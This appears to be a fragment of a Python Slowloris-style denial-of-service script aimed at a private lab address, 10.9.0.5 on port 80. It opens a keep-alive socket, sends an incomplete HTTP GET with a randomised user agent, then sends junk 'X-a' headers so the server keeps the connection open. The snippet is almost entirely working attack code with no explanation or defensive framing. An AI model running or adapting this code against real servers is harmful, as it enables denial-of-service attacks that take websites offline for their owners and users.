IP = 10.9.0.5
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
#s.settimeout(100) # maybe this line can be removed or set really high idk yet
s.connect((IP, port))
s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n".encode())
s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
s.send("Accept-language: en-US,en,q=0.5\r\n".encode())

try:
    s.send(f"X-a {random.randint(1,255)}\r\n".encode())
except Exception as e:
    print(f"socket removed: {e}")
